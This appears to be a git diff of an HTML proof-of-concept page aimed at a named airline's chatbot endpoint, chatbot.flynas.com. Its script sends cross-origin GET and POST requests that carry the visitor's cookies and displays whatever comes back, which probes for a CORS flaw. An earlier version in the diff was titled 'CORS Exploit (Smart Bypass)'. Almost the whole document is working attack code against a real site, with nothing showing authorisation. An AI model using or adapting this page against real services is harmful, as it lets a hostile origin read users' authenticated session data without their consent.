@@ -1,43 +1,52 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
   <meta charset="UTF-8">
-  <title>Flynas CORS PoC</title>
+  <title>Flynas Chatbot CORS PoC</title>
+  <style>
+    body { background:#111; color:#eee; font-family:monospace; padding:20px; }
+    input,button { padding:8px; margin:5px; }
+    pre { background:#222; padding:10px; white-space:pre-wrap; word-wrap:break-word; }
+  </style>
 </head>
 <body>
-  <h2>Flynas CORS Exploit (Smart Bypass)</h2>
-  <p>Enter endpoint from <code>chatbot.flynas.com</code> and click Fetch:</p>
+  <h2>Flynas Chatbot CORS PoC</h2>
 
-  <input id="url" type="text" size="120"
-         placeholder="https://chatbot.flynas.com/socket.io/?EIO=3&transport=polling&t=xxxx">
-  <button onclick="fetchData()">Fetch Data</button>
+  <input type="text" id="url" size="80"
+    value="https://chatbot.flynas.com/socket.io/?EIO=3&transport=polling" />
+
+  <br>
+  <button onclick="doGet()">GET Test</button>
+  <button onclick="doPost()">POST Test</button>
 
   <h3>Response:</h3>
   <pre id="output"></pre>
 
   <script>
-    async function fetchData() {
-      const targetUrl = document.getElementById("url").value;
-      const output = document.getElementById("output");
-      output.textContent = "Fetching...";
-
+    async function doGet() {
+      const url = document.getElementById("url").value;
       try {
-        const res = await fetch(targetUrl, {
-          method: "GET",
-          mode: "cors",
-          credentials: "include",
-          headers: {
-            "Origin": window.location.origin,   // دومينك على GitHub Pages
-            "Referer": "https://www.flynas.com/",
-            "User-Agent": navigator.userAgent,
-            "Accept": "application/json, text/plain, */*"
-          }
-        });
+        let res = await fetch(url, { credentials: "include" });
+        let text = await res.text();
+        document.getElementById("output").innerText = text;
+      } catch (e) {
+        document.getElementById("output").innerText = e;
+      }
+    }
 
-        const text = await res.text();
-        output.textContent = text;
-      } catch (err) {
-        output.textContent = "Error: " + err;
+    async function doPost() {
+      const url = document.getElementById("url").value;
+      try {
+        let res = await fetch(url, {
+          method: "POST",
+          credentials: "include",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ text: "Hello from PoC site" })
+        });
+        let text = await res.text();
+        document.getElementById("output").innerText = text;
+      } catch (e) {
+        document.getElementById("output").innerText = e;
       }
     }
   </script>
